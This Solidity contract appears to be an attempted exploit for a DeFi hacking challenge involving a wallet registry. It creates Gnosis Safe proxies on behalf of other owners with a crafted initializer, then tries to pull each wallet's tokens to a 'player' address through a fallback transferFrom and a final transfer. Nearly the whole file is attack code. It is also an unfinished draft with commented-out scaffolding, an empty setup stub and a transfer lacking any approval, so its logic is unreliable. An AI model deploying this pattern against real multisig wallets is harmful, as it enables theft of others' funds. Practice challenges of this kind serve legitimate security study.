// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IGnosisSafe {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        address callback
    ) external returns (address proxy);
}

contract testWalletRegistry {
    address player;
    address safe;
    address token;
    address[] owners;
    uint i;
    address WalletRegistry;
    address safeFacotry;
    address[4] proxys;

    constructor(
        address _token,
        address _player,
        address[] memory _owners,
        address _safe,
        address _safeFacotry,
        address _WalletRegistry
    ) {
        token = _token;
        player = _player;
        owners = _owners;
        safe = _safe;
        safeFacotry = _safeFacotry;
        WalletRegistry = _WalletRegistry;
        while (i < 4) {
            //         function createProxyWithCallback(
            //     address _singleton,
            //     bytes memory initializer,
            //     uint256 saltNonce,
            //     IProxyCreationCallback callback
            // ) public returns (GnosisSafeProxy proxy)
            // IGnosisSafe(safe).execTransaction(
            //     WalletRegistry,
            //     0,
            //     data[i],
            //     0,
            //     1000000,
            //     1000000,
            //     0,
            //     address(0),
            //     payable(player),
            //     signatures[i]
            // );
            //     address[] calldata _owners,
            // uint256 _threshold,
            // address to,
            // bytes calldata data,
            // address fallbackHandler,
            // address paymentToken,
            // uint256 payment,
            // address payable paymentReceiver
            address[] memory owner = new address[](1);
            owner[0] = owners[i];
            address proxy = IGnosisSafe(safeFacotry).createProxyWithCallback(
                safe,
                abi.encodeWithSelector(
                    this.setup.selector,
                    owner,
                    1,
                    address(0),
                    "",
                    address(0),
                    address(this),
                    0,
                    address(this)
                ),
                i,
                WalletRegistry
            );
            printTokenBalance(token, proxy, "one proxy");
            proxys[i] = proxy;
            // proxy.call("111");
            i++;
        }
    }

    function start() external {
        //     function execTransaction(
        //     address to,
        //     uint256 value,
        //     bytes calldata data,
        //     Enum.Operation operation,
        //     uint256 safeTxGas,
        //     uint256 baseGas,
        //     uint256 gasPrice,
        //     address gasToken,
        //     address payable refundReceiver,
        //     bytes memory signatures
        // ) public payable virtual returns (bool success)
    }

    function end() external {
        printTokenBalance(token, address(this), "end");
        IERC20(token).transfer(player, 40 ether);
    }

    function printTokenBalance(
        address _token,
        address addr,
        string memory msg
    ) public returns (uint256) {
        (bool suc, bytes memory bal) = _token.call(
            abi.encodeWithSignature("balanceOf(address)", addr)
        );
        require(suc, msg);
        uint256 balance = abi.decode(bal, (uint256));

        console.log(msg, balance);
        return balance;
    }

    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external {}

    // function getThreshold() external pure returns (uint256) {
    //     return 1;
    // }

    // function getOwners() external returns (address[] memory ret) {
    //     ret = new address[](1);
    //     ret[0] = owners[i];
    // }
    fallback() external payable {
        IERC20(token).transferFrom(proxys[i], player, 10 ether);
    }

    receive() external payable {}
}
